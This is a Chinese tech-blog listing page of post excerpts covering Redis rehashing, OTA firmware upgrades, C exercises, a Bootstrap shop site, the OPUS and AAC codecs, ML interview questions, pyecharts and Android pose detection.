在拷贝数据的过程中，Redis客户端仍然在处理请求，此时每处理一个请求，就将该请求涉及到的key进行拷贝操作，从表1拷贝到表2（一次只搬迁一个桶的数据）Redis会有一个定时任务，每隔一段时间就去拷贝一部分的key到表2（一次至少搬迁100个桶的数据） 在进行rehash操作的时候，删除、查找、更新操作会同时在两个哈希表上进行
当查找一个key的时候，会先在表1中进行查找，找不到再到表2去找新添加的元素只会添加到表2，不会再添加到表1，这样就可以保证表1的数据只减不增 触发rehash操作的时机：
缩容操作： Redis 定时任务 serverCron 会在每个周期内检查 bucket 的使用情况。当存放 key 的数量和总 bucket 数的比例小于 HASHTABLE_MIN_FILL(10%)，触发缩容 Rehash 操作扩容操作：每次新增的时候回去检查当前存放的key与bucket的比例，超过了 dict_force_resize_ratio(5)就会触发扩容操作 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/253a3d5f7664eb38172345186172f545/" rel="bookmark">
			RK3568平台 OTA升级原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.前言 在迅速变化和发展的物联网市场，新的产品需求不断涌现，因此对于智能硬件设备的更新需求就变得空前高涨，设备不再像传统设备一样一经出售就不再变更。为了快速响应市场需求，一个技术变得极为重要，即OTA空中下载技术。
物联网平台支持通过OTA方式进行设备固件升级，是智能设备修复系统漏洞、实现系统升级的手段，通过固件升级用户提供更好的服务。OTA固件升级功能不仅能够更新固件，而且还能重新配置片上硬件资源。同时，设备固件可通过OTA固件升级流程获得更新的补丁和更多安全算法防范病毒攻击。
二.什么是OTA升级 通过OTA方式实现固件或软件的升级;
只要是通过无线通信方式实现升级的，都可以叫OTA升级，比如网络/蓝牙。
那什么是有线升级呢，也叫做本地升级，比如我们平时为电脑装系统，就是提前将系统下载到U盘上，再通过USB连接连接到电脑上进行电脑系统升级，也就是说通过UART，USB或者SPI通信接口来升级设备固件就叫做有线升级；
三.OTA升级流程 四.Linux OTA升级 Linux系统的组成：
主要由三大部分组成，包括uboot(引导启动程序)、kernel(内核)和rootfs(根文件系统)。
三者在flash中的分区如下：
应用程序存放于rootfs。
Linux系统的启动流程：
系统升级: Linux系统由uboot\kernel\rootfs三大部分组成，对Linux系统进行升级，也就是对flash中这三个分区的数据进行更新替换。
由于uboot\kernel\rootfs在flash分区中是以二进制数据存储的，与MCU固件在flash中存的是二进制数据一样，包括uboot\kernel\rootfs的升级文件也是以二进制数方式直接写入到对应的Flash分区。其升级方式与MCU固件的升级原理基本是一致的。
一般可在uboot中下载升级包来升级uboot\kernel\rootfs ，与MCU在BootLoader程序中完成升级类似。
更新方式：
1.直接覆盖旧程序；
2.保留旧程序，执行新程序；
直接覆盖旧程序：
保留旧程序，执行新程序：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bd5791652e8734ba70c3605894408cf/" rel="bookmark">
			C语言编程错误整理集合（不定时更新）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 找出整型数组中最大的整数并输出判断三边是否可以构成直角三角形，若能构成则计算该直角三角形的面积计算输入的三边是否能构成三角形，如果能就计算该三角形的周长和面积利用数组实现逆置(数字和字母)输出五个俩位数整数，并且按照个个位数又小到大进行排序从键盘输入十个正整数，并且将最小值和首元素交换，不改变数组内其他元素的值输入二十个整数，由大到小进行排序，最后输出四行每行五个整数求数值n的阶乘（递归方式） 注意一下所有程序皆无文件包含命令，如有需要请自行添加 ! #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;math.h&gt; 找出整型数组中最大的整数并输出 //返回整形数组中最大的偶数 int main() { int a[6]; int i,n,max; printf("请输入整型数组元素\n"); for (i=0;i&lt;6;i++) { scanf("%d",&amp;a[i]); //循环向数组输入内容 } for (i=0;i&lt;6;i++) { if(a[i]%2==0) { max=a[i]; //找出数组中的第一个偶数赋值给max break; //找到第一个偶数后就跳出循环，目的已达到 } } for (i=0;i&lt;6;i++) { if ((a[i]%2==0)&amp;&amp;(a[i]&gt;max)) max=a[i]; //利用攻擂法循环将数组内偶数数值与找的的第一个最大值进行比较，比max大就称为新的max } printf("整型数组中最大的偶数是%d",max); return 0; } 判断三边是否可以构成直角三角形，若能构成则计算该直角三角形的面积 int main() { double a,b,c,s; printf("请输入直角三角形的三边,中间请用空格隔开\n"); scanf("%lf%lf%lf",&amp;a,&amp;b,&amp;c); if ((a*a+b*b==c*c)||(a*a+c*c==b*b)||(b*b+c*c==a*a)) //判断是否为直角三角形（任意两边之和等于第三边） { if(a&gt;b&amp;&amp;a&gt;c) s=b*c/2.0; if(b&gt;a&amp;&amp;b&gt;c) s=a*c/2.0; //为方便计算面积，找出两条直角边 重点！！ if(c&gt;b&amp;&amp;c&gt;a) s=a*b*0.5; //两条直角边相乘除以2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bd5791652e8734ba70c3605894408cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe448820fca1550799e1706a92f37337/" rel="bookmark">
			【bootstrap期末】类steam的游戏购物网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 诚接计算机专业编程作业(C语言、C++、Python、Java、HTML、JavaScript、Vue等)，
标价10RMB/15RMB每份，如有需要请私信与我联系
本文资源下载地址：https://download.csdn.net/download/weixin_47040861/88628294
视频演示：https://live.csdn.net/v/351672
———————————————————————————————————————————
首先是题目要求：
接下来说说文件，该文件共包含三个页面，分别是登录页(index.html)、主页(home.html)、详情页(details.html)
1.登录/注册页 该页面包括了登录和注册两个表单，根据点击登录按钮或注册按钮在两个表单之间进行切换。
功能包括：
切换表单：点击“登录”按钮或“注册”按钮，可以在登录表单和注册表单之间进行切换显示。注册功能：在注册表单中输入用户名、账号和密码，点击“注册”按钮后，会将注册信息以JSON格式存储在本地存储中，并弹出“用户注册成功！”的提示框。登录功能：在登录表单中输入账号和密码，点击“登录”按钮后，会从本地存储中获取用户信息并进行匹配验证，若匹配成功则弹出“用户登录成功！”的提示框，并跳转到名为“home.html”的页面，否则会提示“用户名或密码错误，请重新输入！” 2.主页 该页面主要包含以下功能：
顶部导航栏：包含了多个导航链接，以及响应式按钮，使用了Bootstrap的navbar组件进行样式设计，包括品牌logo、导航链接和响应式折叠按钮，当屏幕宽度较小时导航会折叠为一个按钮，单击该按钮呼出下方扩展栏。
轮播：通过Bootstrap的Carousel组件实现了一个图片轮播效果，包括轮播图片、指示器和控制按钮，可以使用两侧箭头调整轮播，也可以使用下方的横条。
精选商品展示：展示了几个特别优惠的商品卡片，包括商品图片、简短介绍以及“加入购物车”和“详情”按钮。在不同屏幕尺寸下，商品展示的布局也会有所不同，同时单击详情按钮可以跳转到详情页。
游戏分类展示：使用了标签页（Tab）的形式，展示了不同类别的游戏图片，点击不同的标签页会显示对应类别的游戏图片。
使用的Bootstrap：
Navbar组件：用于创建顶部导航栏，包括品牌logo、导航链接和响应式折叠按钮。Carousel组件：用于实现轮播效果，包括图片轮播、指示器和控制按钮。网格系统和卡片：使用了Bootstrap的网格系统来对特别优惠商品进行布局，并通过卡片（Card）组件展示商品信息。标签页（Tab）组件：使用了Bootstrap的标签页组件，创建了游戏分类的切换效果。响应式布局：通过Bootstrap的栅格系统实现了页面在不同屏幕尺寸下的自适应布局。 3.详情页 该页面实现了以下功能：
响应式布局：使用了 Bootstrap 的 Navbar 组件，包含有品牌 Logo 和多个导航链接，具有响应式布局，同时页面内容会根据页面宽度进行适当调整。
留言板：该页面可以将用户输入的内容添加到下方的留言列表里，在输入框输入内容后点击“发表留言”按钮即可触发监听事件。
视频：页面中间的视频可以正常播放。
使用的 Bootstrap：
Navbar 组件：用于创建顶部导航栏，包含有 Logo 和导航链接。按钮：使用了 Bootstrap 的按钮组件。网格系统：虽然没有直接在代码中指定，但通过设置了 .col-8 和 .col-4 类来实现了基于 Bootstrap 的栅格系统布局。表单控件：用了 Bootstrap 的表单组件，比如 form-control 类。按钮样式：加入购物车按钮使用了 Bootstrap 的按钮样式（.btn 和 .btn-secondary 类）。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c6acaa59a4585ef90c3b2260475e542/" rel="bookmark">
			音视频编解码——音频编解码格式OPUS（Opus Interactive Audio Codec）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OPUS（Opus交互式音频编解码器）是一种开放、免版权的音频编解码格式，它旨在提供低延迟、高音质的音频传输和存储解决方案。
OPUS编解码器的核心原理：混合了多种音频编解码技术，包括线性预测编码（LPC）、MDCT变换、矢量量化、熵编码等。它利用语音信号的特性进行声学建模和数据压缩，以实现高效的音频编解码。
OPUS音频编解码的步骤如下：
①、预处理：原始音频信号经过预处理步骤，包括滤波、重采样、音频增益调整等，以适应编码器的要求。
②、分帧：音频信号被分成较短的时间片段，通常为20毫秒至60毫秒。每个时间片段称为一个帧，用于后续处理和编码。
③、特征提取：对每个帧进行特征提取，常见的特征包括短时频谱、倒谱系数、线性预测系数等，用于声学建模和编码。
④、编码：采用多种编码技术对提取的特征进行编码。OPUS使用了混合编码的方法，包括MDCT变换、矢量量化、残差编码等。编码过程中，根据音频信号的特性选择合适的编码算法和参数。
OPUS支持多种编码模式，包括VOIP模式（适用于实时通信）、音乐模式（适用于音乐和高保真音频）、语音模式（适用于语音和语音识别）等。每种模式都针对不同的音频类型和应用场景进行了优化，以提供最佳的音频质量和压缩效率。
OPUS提供了多种码率控制模式，包括恒定比特率（CBR）、可变比特率（VBR）和恒定质量（CVBR）。恒定比特率模式固定每个帧的比特率，适用于网络带宽固定或有严格比特率限制的场景；可变比特率模式根据音频内容动态调整比特率，以提供更高的压缩效率；恒定质量模式通过自适应比特率控制，以保持一致的音频质量。
编码器实现：OPUS编码器是由一组开源库和工具组成，可供开发人员使用。其中包括libopus库，它是一个用于编码和解码OPUS音频的C语言库。libopus提供了简单的API，使开发人员可以轻松地集成OPUS编解码功能到他们的应用程序中。
语音活动检测（VAD）：OPUS编码器集成了语音活动检测（VAD）功能。VAD可以检测输入音频中的语音活动和非语音活动部分，并相应地调整编码参数。这有助于减少非语音活动部分的编码量，提高压缩效率。
⑤、熵编码：对编码后的数据进行熵编码，以减少数据的表示所需的比特数。OPUS使用了多种熵编码技术，如算术编码、霍夫曼编码等。
⑥、打包：将编码和熵编码后的数据打包成音频帧，包括音频数据、控制信息、帧同步标志等。打包后的数据可以进行传输或存储。
音频流封装：OPUS编码的音频可以以不同的封装格式进行存储或传输。常见的封装格式包括Ogg封装格式（.ogg文件）、Matroska封装格式（.mkv文件）和WebM封装格式（.webm文件）。这些封装格式可以容纳OPUS编码的音频数据以及其他相关信息，如元数据、时间戳和同步信息。
比特率范围：OPUS支持的比特率范围很广，从非常低的比特率（例如6 kbps）到非常高的比特率（例如512 kbps）。这使得OPUS适用于不同的应用需求，从低带宽网络环境到高质量音频存储。
混流和分流：OPUS编码器还支持多个音频流的混流和分流。这意味着可以将多个音频流合并成一个OPUS流，或者从一个OPUS流中分离出多个音频流。这种能力对于多路音频传输和处理非常有用，例如音频会议中的多个参与者。
⑦、解码：接收端或解码端接收到打包的数据后，进行解码操作。解码过程与编码过程相反，包括解析数据帧、熵解码、解码特征、合成音频等。
⑧、合成：解码后的特征经过合成处理，包括逆变换、重叠、相加等，以还原原始的音频信号。
⑨、后处理：解码后的音频信号进行后处理，包括滤波、音频增益调整、重采样等，以适应最终的播放设备或应用需求。
OPUS被设计为低延迟的音频编解码器，适用于实时通信等对延迟要求较高的应用。OPUS的延迟主要由帧长和编码算法决定，较短的帧长可以减少延迟，但会导致较高的比特率。在VOIP模式下，OPUS可以实现非常低的端到端延迟，通常在20毫秒到60毫秒之间。
容错性：OPUS具有一定的容错性，可以在网络丢包或丢失部分数据的情况下仍能提供较好的音频质量。OPUS使用了纠错编码和前向纠错技术，通过重采样、插值和隐藏丢失数据等方法来恢复丢失的音频数据。
平台支持：OPUS是一种跨平台的音频编解码格式，支持在多种操作系统和硬件平台上使用。它具有广泛的应用支持，包括桌面应用、移动应用、浏览器等，可以在不同设备和平台上进行音频编解码和传输。
音频质量：OPUS以其出色的音频质量而闻名。它具有广泛的音频频带宽范围（从超低频到高频），能够适应不同类型的音频内容，并提供高保真度的音频重现。
低延迟：OPUS被设计为低延迟的音频编解码器，适用于实时通信应用。它可以在保持较低延迟的同时提供高质量的音频传输。
高效的压缩：OPUS具有出色的压缩性能，可以在较低的比特率下提供高质量的音频。它采用了多种音频编码技术和自适应比特率控制，以提供最佳的音频编解码效率。
支持多通道音频：OPUS支持多通道音频编解码，包括立体声、5.1声道和7.1声道等。这使得OPUS适用于多通道音频应用，如音频录制、音频处理和游戏音频。
不同应用场景的配置参数：OPUS提供了一系列的配置参数，允许用户根据应用需求进行定制。这些参数包括帧大小、比特率、预测算法和复杂度等。通过调整这些参数，可以在音频质量、延迟和压缩率之间进行平衡。
总体而言，OPUS是一种灵活、高效和适用于多种应用场景的音频编解码格式。OPUS的编解码过程可以根据实际需求进行参数配置，以平衡音频质量、延迟和压缩率，它能够提供低延迟、高音质的音频传输和存储解决方案，广泛用于语音通信、音频会议、流媒体、语音识别和语音交互等领域。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e64958bc6bd4387874b6ddb4a8b2d16/" rel="bookmark">
			音视频编解码——音频编解码格式AAC（Advanced Audio Coding）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 AAC（Advanced Audio Coding）是一种广泛使用的音频编解码格式，它采用了先进的压缩算法，旨在提供更高的音频质量和更低的比特率。
一、原理：
AAC基于声学模型和感知编码原理，利用人耳对声音的感知特性，对音频信号进行压缩。它主要采用了以下技术：
1、频域分析：将音频信号转换为频域表示，通常使用快速傅里叶变换（FFT）进行频谱分析。
2、时频掩蔽效应：利用人耳的掩蔽特性，对较弱的信号在较强的信号存在时进行掩盖处理，减少对较弱信号的编码量。
3、频率线性化：对频域表示的音频信号进行频率线性化处理，旨在改善音频信号在低比特率下的编码效果，以更好地适应人耳的感知特性。
下面是几种常见的频率线性化方法：
①、频率分组：
频率分组是一种将频率范围划分为多个子带的方法。音频信号的频谱被分成多个不重叠的子带，每个子带内的频率范围相对较窄。这样做的目的是更好地适应人耳对不同频率范围的感知敏感度的差异。在编码过程中，可以对每个子带内的频谱系数进行不同的处理，以更好地控制编码质量。
②、感知加权：
感知加权是通过对频谱系数应用不同的加权系数，以更好地模拟人耳对不同频率的敏感度差异。根据人耳感知特性，对于较高频率的信号，可以应用较低的加权系数，而对于较低频率的信号，可以应用较高的加权系数。这样做可以有效地分配比特率，使得高频信号和低频信号都能得到适当的编码精度。
③、非线性变换：
非线性变换是一种通过对频谱系数应用非线性函数来改变其分布的方法。常见的非线性变换函数包括对数函数、幂函数等。通过非线性变换，可以改变频谱系数的动态范围，将较小幅度的系数放大，而将较大幅度的系数压缩，以更好地适应人耳对不同幅度信号的感知特性。
④、动态码率控制：
动态码率控制是根据音频信号的特性和编码需求，实时调整编码器的比特率。在频率线性化中，动态码率控制可以根据频率范围的重要性和感知敏感度，为不同频率范围分配不同的比特率。对于人耳更敏感的频率范围，可以分配更多的比特率，以保留更多的细节和音质。
4、熵编码：应用熵编码技术对频域信息进行高效压缩，熵编码是一种常用的数据压缩技术，旨在通过利用数据的统计特性来减少数据的表示所需的比特数。它基于信息论中的熵概念，将出现频率高的符号用较少的比特表示，而出现频率低的符号用较多的比特表示。
熵编码的原理：
熵编码的原理基于信息论中的香农熵（Shannon entropy）概念。香农熵是对一个离散随机变量的平均信息量的度量。在熵编码中，根据数据的统计特性，将出现频率较高的符号用较短的编码表示，而出现频率较低的符号用较长的编码表示。这样可以有效地减少整体数据的表示所需的比特数。
熵编码的一般步骤如下：
①、统计符号频率：对待编码的数据进行统计分析，计算每个符号（如字符、像素等）出现的频率。
②、构建编码表：根据符号频率构建编码表，将高频率的符号映射到较短的编码，低频率的符号映射到较长的编码。常见的编码表包括霍夫曼树、算术编码表等。
③、编码：根据构建的编码表，将原始数据中的每个符号替换为相应的编码。
④、存储编码：将编码后的数据存储为比特流，通常是以比特为单位进行存储。
⑤、解码：使用相同的编码表，将存储的编码数据解码为原始数据。解码过程是编码过程的逆过程，通过逆向查找编码表，将编码还原为原始符号。
熵编码的优点：
可以根据数据的统计特性进行自适应编码，较高频率的符号可以用较少的比特表示，从而获得更高的压缩率。常见的熵编码算法包括霍夫曼编码、算术编码、自适应编码等。在实际应用中，根据数据的特点和压缩需求，选择适合的熵编码算法以获得更好的压缩效果。
二、编码步骤：
1、音频分帧：将音频信号按照固定长度的帧进行分割，通常每帧有几十毫秒的音频数据。
2、窗函数应用：对每个音频帧应用窗函数，以减少频谱泄漏。
3、频谱分析：对窗函数应用后的音频帧进行频谱分析，通常使用FFT将时域信号转换为频域表示。
4、感知模型：基于人耳的感知特性，对频谱进行掩蔽效应处理，减少对掩盖区域的编码量。
5、量化和编码：对频谱进行量化，将具有较小幅度的系数用较少的比特表示，而较大幅度的系数用更多的比特表示。
6、熵编码：应用熵编码技术（如霍夫曼编码等）对量化后的数据进行进一步压缩。
7、打包和封装：将压缩后的音频数据打包为AAC格式的数据流，并添加音频元数据和同步信息。
三、AAC的解码过程是编码过程的逆过程，包括以下步骤：
1、数据解封装：从AAC数据流中提取出音频数据和元数据。
数据解封装是在数据通信和存储中常见的一个过程，用于将封装格式中的数据提取出来，以便进行后续的处理或回放。
数据解封装的原理：
根据封装格式的规范，识别和提取出封装格式中的各个组成部分，包括音频、视频、字幕、元数据等。封装格式通常包含了描述媒体数据结构、媒体流关系、时间轴信息和元数据等信息，因此在解封装过程中需要解析这些信息，并将媒体数据和相关信息分离出来。
数据解封装的一般步骤如下：
①、识别封装格式：首先需要识别使用的封装格式，例如常见的MP4、AVI、MKV等。封装格式通常有特定的文件头或标识符，可以通过读取文件头或标识符来确定封装格式。
②、解析封装格式：根据封装格式的规范，解析封装格式中的结构和元数据。这包括读取封装格式中的索引表、时间戳信息、媒体流的描述信息等。解析过程中，需要根据封装格式的语法规则，从文件中提取出各个组成部分的数据。
③、提取媒体数据：根据解析得到的信息，提取出音频、视频、字幕等媒体数据。这可以通过读取封装格式中的媒体流数据块，并根据时间戳信息对其进行排序和组织，以得到原始的媒体流。
④、解码媒体数据：对提取出的媒体数据进行解码，以还原为原始的音频、视频等。这包括使用相应的解码器对音频和视频进行解码，以获得可播放或可处理的原始媒体数据。
⑤、处理附加信息：解封装过程还可以包括处理附加的元数据信息，如媒体描述、字幕、章节等。这些附加信息可以用于媒体的展示、搜索、索引等功能。
元数据是描述数据的数据，它提供有关数据的信息，如数据的结构、特性、属性和关系等。元数据可以帮助用户理解和管理数据，支持数据的组织、检索、分析和处理。
元数据通常包括以下几个方面的信息：
描述性元数据（Descriptive Metadata）：描述性元数据提供有关数据内容的信息，例如数据的标题、摘要、关键字、主题、作者、创建日期等。它可以帮助用户快速了解数据的基本特征和内容。
结构性元数据（Structural Metadata）：结构性元数据描述数据的组织结构和格式，它可以告诉用户数据是如何组织的、如何分段和链接等。例如，对于多媒体数据，结构性元数据可以描述音频、视频和字幕等的关系和时序。
管理性元数据（Administrative Metadata）：管理性元数据包含与数据管理和维护相关的信息，例如数据的访问权限、存储位置、所有权、版本控制、数据质量等。它可以帮助数据管理员有效管理和维护数据资源。
技术性元数据（Technical Metadata）：技术性元数据提供与数据处理和交换相关的信息，例如数据的文件格式、编码方式、分辨率、采样率、数据源、数据的创建工具和参数等。这些信息对于数据的处理、解析和转换非常重要。
元数据在数据管理和数据应用中起着关键的作用，它可以帮助用户更好地理解和使用数据资源。通过元数据，用户可以快速搜索和定位所需的数据，了解数据的可信度和适用性，进行数据整合和集成，以及支持数据分析、挖掘和决策等。元数据还在数据共享和数据交换中扮演重要角色，确保数据的正确解释和正确使用。
2、熵解码：对压缩的数据进行熵解码，还原量化后的频谱系数。
3、逆量化：对解码后的频谱系数进行逆量化，恢复到量化前的表示。
4、频谱合成：将逆量化后的频谱系数进行频谱合成，恢复到频域表示的音频帧。
5、时域合成：对频域表示的音频帧进行逆FFT，将其转换为时域信号。
6、窗函数去除：对时域信号应用逆窗函数，去除窗函数的影响。
7、帧重叠和合成：对解码后的音频帧进行适当的帧重叠和合成，以实现平滑的音频输出。
通过以上编解码步骤，AAC能够在较低的比特率下提供高质量的音频压缩和解压缩，广泛应用于数字音频传输、存储和广播等领域。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e10da2cc1e43309c71ead0191d56fdb/" rel="bookmark">
			腾讯算法面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手写SE Layer
SE (Squeeze-and-Excitation) Layer是一种注意力机制，通常应用于深度神经网络的不同层次，以提高模型的表示能力。SE Layer主要包含两个步骤：Squeeze和Excitation。以下是一个简单的手写SE Layer的Python实现：
```python import torch import torch.nn as nn import torch.nn.functional as F class SELayer(nn.Module): def __init__(self, channels, reduction_ratio=16): super(SELayer, self).__init__() self.channels = channels self.reduction_ratio = reduction_ratio # Squeeze操作 self.squeeze = nn.AdaptiveAvgPool2d(1) # Excitation操作 self.excitation = nn.Sequential( nn.Linear(channels, channels // reduction_ratio), nn.ReLU(inplace=True), nn.Linear(channels // reduction_ratio, channels), nn.Sigmoid() ) def forward(self, x): # Squeeze squeezed = self.squeeze(x) squeezed = squeezed.view(-1, self.channels) # Excitation excitation = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e10da2cc1e43309c71ead0191d56fdb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8695070514e9b2640c07342e6ba4ca23/" rel="bookmark">
			python绘图之pyecharts
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载安装pyecharts 链接：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyecharts
柱状图 导入pyecharts包
from pyecharts import options as opts from pyecharts.charts import Bar 作图
from pyecharts.charts import Bar #导入Bar #生成Bar对象 bar = Bar() #为x轴添加数据 bar.add_xaxis(["衬衫", "羊毛衫", "雪纺衫", "裤子", "高跟鞋", "袜子"]) #为y轴添加数据 bar.add_yaxis("商家A", [5, 20, 36, 10, 75, 90]) #在本地生成HTML文件 bar.render() 作图如下
这里说明一下pyecharts 所有方法均支持链式调用。
什么是链式调用？
上面作图方式用链式调用方法代码如下 from pyecharts.charts import Bar bar = ( Bar() .add_xaxis(["衬衫", "羊毛衫", "雪纺衫", "裤子", "高跟鞋", "袜子"]) .add_yaxis("商家A", [5, 20, 36, 10, 75, 90]) ) bar.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8695070514e9b2640c07342e6ba4ca23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13db844f2d828197527354a05803913a/" rel="bookmark">
			字节跳动面经题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字节跳动面经题 1、了解anchor-free?
"Anchor-free"是一个指向一类目标检测方法的术语，与传统的"anchor-based"方法相对应。在传统的目标检测中，通常会使用一系列预定义的锚框（anchors）作为模型的基础。这些锚框在图像中密集地分布，并用于生成目标框的候选区域，然后通过对这些候选区域进行分类和回归来完成目标检测。
与此不同，anchor-free方法直接预测目标框的位置，而不需要事先定义锚框。这种方法的优势在于更加灵活，不需要对不同尺度和纵横比的目标事先进行假设。它能够更好地适应各种目标形状和大小。
以下是一些anchor-free目标检测方法的例子：
CenterNet： CenterNet是一种基于中心点的目标检测方法，它通过直接预测目标的中心点来定位目标。该方法不需要锚框，且在速度和准确性方面表现良好。
FCOS（Fully Convolutional One-Stage Object Detection）： FCOS是一种全卷积的单阶段目标检测方法，通过预测目标的中心、边界框和类别信息来完成目标检测。与传统的两阶段方法和锚框相关的方法相比，FCOS简化了整个目标检测过程。
ATSS（Adaptive Training Sample Selection）： ATSS是一种自适应训练样本选择方法，它能够根据目标的难易程度动态调整样本权重，提高对难以检测目标的关注度。ATSS方法也是一种anchor-free的目标检测方法。
总体而言，anchor-free方法在目标检测领域取得了一些显著的进展，尤其是在简化模型结构、提高性能和加速推理过程方面。然而，不同的任务和数据集可能需要不同的方法，因此在选择目标检测方法时需要考虑具体的应用场景。
anchor-based 和anchor-free区别
Anchor-based和Anchor-free是两种不同的目标检测方法，它们的主要区别在于如何生成候选区域（即目标框）以及如何进行目标框的位置回归。以下是它们的主要区别：
锚框的使用： Anchor-based： 在anchor-based方法中，先验框（anchor）是在图像中密集分布的预定义框。这些锚框通常具有不同的尺寸和宽高比，用于生成候选目标框。模型在训练过程中学习调整这些先验框的位置以适应真实目标的位置。
Anchor-free： 在anchor-free方法中，不需要预定义的锚框。模型直接从图像中学习生成目标框的位置，而无需依赖预先定义的锚点。
小目标有什么优化方面？输入分辨率，专门的一些网络(coco大小目标)，注意力机制，fpn
处理小目标检测任务时，面临一些挑战，例如目标尺寸小、目标与背景比例失衡等。以下是一些优化方面，涉及输入分辨率、网络结构和注意力机制等：
输入分辨率优化：
高分辨率输入： 使用较高的输入分辨率可以有助于提高小目标的检测精度。较高分辨率的图像可以提供更多的细节，使得网络更容易捕捉到小目标。但要注意，高分辨率也可能导致计算复杂性增加，因此需要在计算资源和性能之间找到平衡。
多尺度输入： 采用多尺度输入或图像金字塔的方式，允许网络在不同分辨率下进行检测，从而更好地适应不同尺寸的目标。
网络结构优化：
专门设计的网络： 一些网络架构专门设计用于小目标检测，例如YOLO（You Only Look Once）或SSD（Single Shot Multibox Detector）。这些方法通常具有高效的计算和设计，以适应小目标的检测需求。
特征金字塔网络（FPN）： 使用FPN可以帮助网络有效地处理不同尺寸的目标。FPN通过从不同层次的特征图中提取信息，构建金字塔式的特征表示，有助于在不同尺度下检测目标。
注意力机制优化：
空间注意力机制： 引入空间注意力机制，使网络更关注小目标区域。通过在网络中引入注意力机制，可以提高网络对小目标的感知能力。
通道注意力机制： 考虑使用通道注意力机制，以便网络能够更好地学习对小目标有用的特征通道。
数据增强和样本平衡：
数据增强： 使用适当的数据增强技术，如随机裁剪、缩放、旋转等，有助于训练模型更好地适应小目标的变化。
样本平衡： 确保训练数据中包含足够数量的小目标样本，以避免类别不平衡问题。
后处理技术：
非极大值抑制（NMS）调参： 在使用NMS进行框的合并时，可以调整阈值以适应小目标的检测。对于小目标，可能需要更灵敏的NMS参数。
综合考虑上述因素，可以构建一个针对小目标检测任务进行优化的综合解决方案。在实际应用中，根据具体问题的特点和数据集的分布，可能需要进一步调整和优化这些方法。
yolo比RetinaNet的优势
YOLO (You Only Look Once) 和 RetinaNet 都是流行的目标检测算法，各自具有一些优势和适用场景。以下是一些 YOLO 相对于 RetinaNet 的优势：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13db844f2d828197527354a05803913a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cb5c0360febb650d04a4e6b60c6e53d/" rel="bookmark">
			人体关键点检测3：Android实现人体关键点检测(人体姿势估计)含源码 可实时检测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 前言
2.人体关键点检测方法
(1)Top-Down(自上而下)方法
(2)Bottom-Up(自下而上)方法：
3.人体关键点检测模型训练
4.人体关键点检测模型Android部署
（1） 将Pytorch模型转换ONNX模型
（2） 将ONNX模型转换为TNN模型
（3） Android端上部署模型
（4） Android测试效果 （5） 运行APP闪退：dlopen failed: library "libomp.so" not found
5.Android项目源码下载
6.C++实现人体关键点检测
1. 前言 人体关键点检测（Human Keypoints Detection）又称为人体姿态估计2D Pose，是计算机视觉中一个相对基础的任务，是人体动作识别、行为分析、人机交互等的前置任务。一般情况下可以将人体关键点检测细分为单人/多人关键点检测、2D/3D关键点检测，同时有算法在完成关键点检测之后还会进行关键点的跟踪，也被称为人体姿态跟踪。
项目将实现人体关键点检测算法，其中使用YOLOv5模型实现人体检测(Person Detection)，使用HRNet，LiteHRNet和Mobilenet-v2模型实现人体关键点检测。为了方便后续模型工程化和Android平台部署，项目支持高精度HRNet检测模型，轻量化模型LiteHRNet和Mobilenet模型训练和测试，并提供Python/C++/Android多个版本；项目分为数据集说明，模型训练和C++/Android部署等多个章节，本篇是项目《人体关键点检测(人体姿势估计)》系列文章之Android实现人体关键点检测，主要分享将Python训练好的模型移植到Android平台，搭建一个可实时的人体关键点检测Android Demo，且支持多人关键点检测。
轻量化Mobilenet-v2模型在普通Android手机上可以达到实时的检测效果，CPU(4线程)约50ms左右，GPU约30ms左右 ，基本满足业务的性能需求。下表格给出HRNet，以及轻量化模型LiteHRNet和Mobilenet的计算量和参数量，以及其检测精度。
模型input-sizeparams(M)GFLOPsAPHRNet-w32192×25628.48M5734.05M0.7585LiteHRNet18192×2561.10M182.15M0.6237Mobilenet-v2192×2562.63M529.25M0.6181 【尊重原创，转载请注明出处】 https://blog.csdn.net/guyuealian/article/details/134881797
Android人体关键点检测APP Demo体验(下载)：https://download.csdn.net/download/guyuealian/88610359
Android人体关键点检测APP Demo体验
更多项目《人体关键点检测(人体姿势估计)》系列文章请参考：
